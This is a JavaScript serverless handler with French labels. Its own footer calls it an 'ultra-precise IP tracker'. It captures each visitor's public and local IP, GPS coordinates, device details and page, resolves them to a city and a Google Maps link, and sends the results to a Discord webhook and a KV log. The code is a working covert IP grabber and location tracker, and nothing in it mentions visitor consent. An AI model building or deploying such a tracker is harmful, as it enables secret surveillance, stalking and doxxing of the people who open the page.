export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  const forwarded = req.headers['x-forwarded-for'];
  const publicIp = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
  
  let geo = {};
  try {
    // Utilisation d'un service plus précis avec plus de détails
    const geoRes = await fetch(`http://ip-api.com/json/${publicIp}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
    geo = await geoRes.json();
  } catch (e) {
    console.error("Erreur géo:", e);
  }

  const { localIp, preciseLocation, userAgent, language, screenResolution, referrer, page } = req.body;

  let displayLocation = `${geo.city || 'Inconnue'} (${geo.regionName || ''}), ${geo.country || 'Inconnu'} [ZIP: ${geo.zip || '?'}]`;
  
  // Si on a le GPS, on essaie de trouver le nom de la ville réelle (Reverse Geocoding)
  if (preciseLocation) {
    try {
      const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.lat}&lon=${preciseLocation.lon}`, {
        headers: { 'User-Agent': 'SaadaaTracker/1.0' }
      });
      const revData = await revRes.json();
      if (revData && revData.address) {
        const city = revData.address.city || revData.address.town || revData.address.village || revData.address.municipality;
        const county = revData.address.county || revData.address.state;
        displayLocation = `📍 ${city || 'Ville inconnue'} (${county || ''}), ${revData.address.country}`;
      }
    } catch (e) {
      console.error("Erreur reverse géo:", e);
      displayLocation = `✅ GPS PRÉCIS (Coordonnées OK)`;
    }
  }

  const logEntry = {
    timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
    publicIp,
    localIp,
    location: displayLocation,
    isp: geo.isp || 'ISP inconnu',
    coords: preciseLocation ? `${preciseLocation.lat}, ${preciseLocation.lon}` : `${geo.lat || '?'}, ${geo.lon || '?'}`,
    isPrecise: !!preciseLocation,
    userAgent,
    language,
    screenResolution,
    referrer,
    page: page || 'Inconnue'
  };

  console.log('NOUVELLE VISITE CAPTURÉE:', JSON.stringify(logEntry, null, 2));

  // Envoi vers Discord
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  if (webhookUrl) {
    const cleanCoords = logEntry.coords.replace(/\s/g, '');
    const mapsLink = `https://www.google.com/maps?q=${cleanCoords}`;
    const locValue = logEntry.isPrecise 
      ? `✅ **LOCALISATION RÉELLE (GPS)**\n**${logEntry.location}**\n\n📍 [Ouvrir dans Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
      : `❌ IP Uniquement (Approximatif)\n**${logEntry.location}**\nCoords: \`${logEntry.coords}\``;

    const fields = [
      { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
      { name: "🌐 IP Publique (WiFi)", value: `\`${publicIp}\``, inline: true },
      { name: "🏠 IP Locale (Appareil)", value: `\`${localIp}\``, inline: true },
      { name: "📍 Localisation Précise", value: locValue }
    ];

    // On n'ajoute le fournisseur (ISP) QUE si on n'a pas la localisation GPS
    if (!logEntry.isPrecise) {
      fields.push({ name: "📡 Fournisseur (ISP)", value: logEntry.isp });
    }

    fields.push(
      { name: "📄 Page", value: logEntry.page },
      { name: "📱 Appareil", value: `\`${userAgent.substring(0, 250)}\`` },
      { name: "🖥️ Résolution", value: screenResolution, inline: true }
    );

    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "🚀 Nouvelle Visite sur le Site !",
            color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500,
            fields: fields,
            footer: { text: "Tracker IP Ultra-Précis - Saadaa le Goat" }
          }]
        })
      });
    } catch (e) {
      console.error("Erreur Webhook Discord:", e);
    }
  }

  // Stockage pour le fichier .txt (Vercel KV)
  if (process.env.KV_REST_API_URL && process.env.KV_REST_API_TOKEN) {
    try {
      const logLine = `[${logEntry.timestamp}] IP:${publicIp} | Local:${localIp} | Loc:${logEntry.location} | Page:${logEntry.page}\n`;
      await fetch(`${process.env.KV_REST_API_URL}/lpush/visitor_logs/${encodeURIComponent(logLine)}`, {
        headers: { Authorization: `Bearer ${process.env.KV_REST_API_TOKEN}` }
      });
    } catch (e) {
      console.error("Erreur Stockage KV:", e);
    }
  }

  return res.status(200).json({ success: true, ip: publicIp });
}
